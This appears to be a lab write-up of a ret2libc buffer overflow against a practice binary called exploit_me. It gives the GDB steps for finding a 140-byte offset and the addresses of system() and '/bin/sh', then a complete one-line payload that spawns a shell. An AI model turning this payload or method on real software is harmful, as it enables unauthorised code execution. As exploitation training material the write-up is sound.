Binary Exploitation Writeup
Target Binary
We are working with a vulnerable binary named exploit_me. The goal is to gain shell access by exploiting a buffer overflow vulnerability and executing the system("/bin/sh") call.

Step 1: Finding the Offset
We first need to determine the offset at which the return address is overwritten. This is done using GDB:

```bash
gdb ./exploit_me
``` 

Inside GDB, we run the binary with a known pattern of characters:

```bash
run $(python -c 'print("A"*144)')
```
After observing where the program crashes, we identify the correct offset. In this case:

```bash
Offset = 140
```

Step 2: Gathering Useful Addresses
We set a breakpoint at the main function to analyze the binary and find the necessary addresses for exploitation:

```bash
b main
run
```

Getting the system() address:
```bash
p system
$1 = 0xb7e6b060
```
Finding the address of /bin/sh in memory:
```bash
find &system,+9999999, "/bin/sh"
0xb7f8cc58
```
Getting the exit() address (optional, for clean exit after shell):
```bash
p exit
$2 = 0xb7e5ebe0
```
Step 3: Crafting the Exploit
We now construct the payload with the following:

- Offset: 140 bytes of padding ("A" * 140)

- Return Address: Address of system() function

- Next 4 Bytes: Return address for system() (can be dummy, or use exit())

- Argument: Address of the /bin/sh string

```bash
./exploit_me `python -c 'print("A"*140 + "\x60\xb0\xe6\xb7" + "AAAA" + "\x58\xcc\xf8\xb7")'`
```
- \x60\xb0\xe6\xb7 → system address: 0xb7e6b060

- "AAAA" → placeholder for the return address (can also be exit)

- \x58\xcc\xf8\xb7 → "/bin/sh" address: 0xb7f8cc58

Result
Running the above command should spawn a shell, confirming successful exploitation.

